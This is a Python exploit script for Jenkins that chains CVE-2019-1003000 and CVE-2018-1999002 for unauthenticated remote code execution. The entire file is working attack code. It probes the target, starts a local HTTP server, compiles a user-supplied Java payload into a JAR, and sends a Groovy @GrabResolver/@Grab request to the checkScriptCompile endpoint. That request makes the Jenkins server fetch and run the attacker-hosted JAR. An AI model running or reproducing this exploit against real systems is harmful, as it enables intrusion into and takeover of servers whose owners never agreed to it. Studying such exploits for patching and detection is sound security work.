#!/usr/bin/env python3
#
# Exploit Title     : jenkins-prce.py
# Date              : 03/15/2019
# Exploit Author    : Raid
# Vendor Homepage   : https://jenkins.oi
# Software Link     : https://jenkins.io/download/
# Tested on         : jenkins=v2.113, v2.107.2 Plugins: Script Security=v1.43, Pipeline: Declarative=v1.1.1, Pipeline: Groovy=v2.60,
#
#
# Description : This exploit chains CVE-2019-1003000 and CVE-2018-1999002 for Pre-Auth Remote Code Execution in Jenkins
# Security Advisory : https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266
#
# Vulnerable Plugins -
# Pipeline: Declarative Plugin up to and including 1.3.4
# Pipeline: Groovy Plugin up to and including 2.61
# Script Security Plugin up to and including 1.49
#
#
# Credit: @orange_8361 & adamyordan
#
# Greets: @akil3s
# http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
# http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html


from http.server import HTTPServer, SimpleHTTPRequestHandler
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import multiprocessing
import requests
import argparse
import random
import os


def check(url: str, port: int) -> bool:
	check_path = '/securityRealm/user/admin/search/index'
	check_params = {'q': 'a'}
	vulnerable = False
	r = requests.get(url + ':' + str(port) + check_path, params=check_params)

	if 'HTTP ERROR 404' not in r.text:
		print("[*] Likelly VULNERABLE")
		vulnerable = True
	else:
		print(r.status_code)
		print("[_] Target doesnt seem vulnerable...")

	return vulnerable


def run_jar_handler(**info: dict):
	server_address = (info['ip'], info['port'])
	httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
	httpd.timeout = 10

	print("[*] Handler ready... Serving")

	httpd.serve_forever()


def initialize_HTTP_server(my_server: str, my_server_port: int) -> (bool, multiprocessing.Process):
	print("[*] Setting up handler...")

	https_handler = multiprocessing.Process(target=run_jar_handler, kwargs={'ip': my_server, 'port': my_server_port})

	https_handler.start()
	sess = requests.Session()
	retries = Retry(connect=10,
	                read=10,
	                redirect=10,
	                status=10,
	                backoff_factor=0.2
	                )
	adapter = HTTPAdapter(max_retries=retries)
	sess.mount('http://', adapter)
	sess.mount('https://', adapter)

	try:
		r = sess.get('http://{local_server}:{local_port}/'.format(
			local_server=my_server,
			local_port=my_server_port)
		)
		print("[*] Server is UP! Took {0}s".format(r.elapsed.total_seconds()))
		httpd_handler_isUp = True
	except (requests.ConnectionError) as e:
		print("[!] I could not set up the HTTP server!")
		print("[i] Please, check your settings:\n\tBind-Address: {local_server}\n\tBind-Port: {local_port}".format(
			local_server=my_server,
			local_port=my_server_port)
		)
		print(str(e))
		httpd_handler_isUp = False

	return httpd_handler_isUp, https_handler


def generate_payload(my_server: str, my_server_port: int, poc_cname: str) -> (str, str):
	letters = 'qwertyuiopasdfghjklzxcvbnm'
	poc_v = random.randint(1, 5)
	poc_g = ''.join([letters[random.randint(0, len(letters) - 1)] for x in range(5)])
	poc_n = poc_cname[:-5]
	jar_path = '{group}/{poc_name}/{poc_version}'.format(group=poc_g,
	                                                     poc_name=poc_n,
	                                                     poc_version=poc_v)

	os.system('javac {0}'.format(poc_cname))
	os.makedirs('./META-INF/services', mode=0o755, exist_ok=True)
	os.makedirs(jar_path, mode=0o755, exist_ok=True)
	with open('./META-INF/services/org.codehaus.groovy.plugins.Runners', 'w') as service_file:
		service_file.write('{class_name}'.format(class_name=poc_n))

	os.system('jar cvf {jar_p}/{poc_name}-{poc_version}.jar ./{poc_classname}.class ./META-INF/'.format(jar_p=jar_path,
	                                                                                                    poc_name=poc_n,
	                                                                                                    poc_version=poc_v,
	                                                                                                    poc_classname=poc_n)
	          )

	exploit_path = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile'
	exploit_params = 'value=@GrabConfig(disableChecksums=true)' \
	                 '%0a@GrabResolver(name=%27{server}%27,%20root=%27http://{server}:{server_port}/%27)' \
	                 '%0a@Grab(group=%27{group}%27,%20module=%27{poc_name}%27,%20version=%27{poc_version}%27)' \
	                 '%0aimport%20{poc_classname};'.format(server=my_server,
	                                                       server_port=my_server_port,
	                                                       poc_name=poc_n, group=poc_g,
	                                                       poc_version=poc_v,
	                                                       poc_classname=poc_n
	                                                       )
	return exploit_path, exploit_params


def exploit(target: str, target_port: int, exploit_path: str, exploit_params: str, timeout: int):
	s = requests.Session()
	request = requests.Request(method='GET', url=target + ':' + str(target_port) + exploit_path)
	prepared_request = request.prepare()

	print("[*] Sending request!")
	prepared_request.url += '?' + exploit_params

	try:
		r = s.send(prepared_request, timeout=timeout)
		print("Received {0} from {1}".format(r.status_code, r.url))
	except requests.exceptions.ReadTimeout:
		print("[*] Response timed-out, CHECK YOUR LISTENER!")


if __name__ == '__main__':

	arg_parser = argparse.ArgumentParser()

	arg_parser.add_argument('--target',
	                        dest='target',
	                        type=str,
	                        help="Target URL; ie: http://something.com",
	                        required=True
	                        )

	arg_parser.add_argument('--target-port',
	                        dest='target_port',
	                        type=int,
	                        help="Target port; ie: 8080",
	                        required=True
	                        )

	arg_parser.add_argument('--local-ip',
	                        dest='local_ip',
	                        type=str,
	                        help="Local IP to set the HTTP handler; ie: 192.168.1.114",
	                        required=True
	                        )

	arg_parser.add_argument('--local-port',
	                        dest='local_port',
	                        type=int,
	                        help="Local port to set the HTTP handler; ie: 4443",
	                        required=True
	                        )

	arg_parser.add_argument('--payload',
	                        dest='poc_code',
	                        type=str,
	                        help="Java source file to use as payload; ie: Payload.java",
	                        required=True
	                        )

	arg_parser.add_argument('--timeout',
	                        dest='timeout',
	                        type=int,
	                        help="If the target is slow, you may want HTTP server to wait a little bit more before giving up.",
	                        required=False,
	                        default=10
	                        )

	args = arg_parser.parse_args()

	target = args.target
	target_port = args.target_port
	local_ip = args.local_ip
	local_port = args.local_port
	poc_code = args.poc_code
	timeout = args.timeout

	check(target, target_port)

	httpd_handler_isUp, httpd_handler = initialize_HTTP_server(local_ip, int(local_port))

	if httpd_handler_isUp:
		exploit_path, exploit_params = generate_payload(local_ip, int(local_port), poc_code)
		exploit(target, int(target_port), exploit_path, exploit_params, timeout)

	httpd_handler.terminate()
